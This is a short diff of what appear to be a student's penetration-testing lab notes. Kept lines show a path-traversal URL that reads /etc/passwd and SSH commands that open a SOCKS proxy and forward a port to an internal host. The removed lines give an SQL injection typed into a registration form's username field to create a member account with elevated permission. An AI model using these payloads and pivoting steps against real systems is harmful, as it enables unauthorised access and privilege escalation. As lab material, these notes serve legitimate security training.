@@ -227,13 +227,6 @@ http://127.0.0.1:1850/books_pick.php?book=../../../../../etc/passwd
 student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -D 9050
 student@lin-ops:/usr/share/nmap/scripts$ ssh -S /tmp/web dummy -O forward -L 1850:10.100.28.55:80
 
-INSERT INTO members (first_name, last_name, username, password, email, permission)
-FN: Hacker
-LN: 
-Username: McGee', '1234', '1234', 1);#
-Password: 1
-Email: 1
-Then login
 
 
 
